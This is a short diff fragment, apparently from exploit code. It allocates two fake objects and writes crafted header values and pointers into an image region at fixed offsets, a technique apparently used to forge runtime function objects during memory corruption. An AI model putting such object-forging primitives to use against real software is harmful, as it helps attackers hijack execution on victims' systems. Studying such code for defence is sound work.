+        var function = Alloc(owner, 0x100); D(function, 0x68, 8 ^ 0x1937f47b); W(function, 0xbc, 5 ^ 0x8250);
+        D(function, 0xb8, 0x54020403); Q(function, 0xe0, image + 0x2000);
+        var empty = Alloc(noArgs, 0x100); D(empty, 0x68, 0x1937f47b); W(empty, 0xbc, 0x8250);
+        D(empty, 0xb8, 0x400); Q(empty, 0xe0, image + 0x2200);
